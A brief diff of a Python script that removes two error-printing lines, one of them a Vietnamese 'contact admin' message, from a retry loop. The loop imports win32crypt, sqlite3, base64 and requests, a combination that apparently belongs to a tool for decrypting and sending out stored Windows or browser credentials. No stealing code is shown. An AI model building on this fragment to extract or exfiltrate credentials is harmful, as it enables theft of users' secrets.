@@ -10,8 +10,6 @@ def install_pip(package):
 while True:
     try:
         if debug_count == 2:
-            print(f"Error log : {error_log}")
-            print("Lỗi không xác định, vui lòng liên hệ admin để được giúp đỡ")
             raise SystemExit
         import os,json,shutil,win32crypt,hmac,platform,sqlite3,base64,random,requests,time,re
         from datetime import datetime,timedelta
